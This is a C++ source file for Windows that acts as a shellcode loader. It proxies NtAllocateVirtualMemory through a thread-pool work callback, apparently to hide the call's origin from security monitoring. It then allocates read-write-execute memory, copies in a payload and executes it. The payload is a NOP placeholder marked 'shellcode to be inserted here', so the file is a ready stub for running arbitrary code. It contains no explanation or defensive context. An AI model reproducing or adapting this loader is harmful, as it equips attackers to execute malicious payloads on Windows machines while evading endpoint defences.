#include <windows.h>
#include <stdio.h>


extern "C" VOID CALLBACK SimpleCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;
    HANDLE hProcess;
    PVOID* address;
    PSIZE_T size;
    ULONG permissions;
} NTALLOCATEVIRTUALMEMORY_ARGS, * PNTALLOCATEVIRTUALMEMORY_ARGS;

int main() {

    unsigned char p[] = { 0x90,0x90,0x90 }; // shellcode to be inserted here


    LPVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = sizeof p;

    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    PTP_WORK ptpWork = CreateThreadpoolWork(SimpleCallback, &ntAllocateVirtualMemoryArgs, NULL);

    SubmitThreadpoolWork(ptpWork);

    Sleep(1000);

    printf("Allocated Address: %p\n", allocatedAddress);
    memcpy(allocatedAddress, p, sizeof p);
    ((void(*)())allocatedAddress)();

    CloseThreadpoolWork(ptpWork);

    return 0;
}
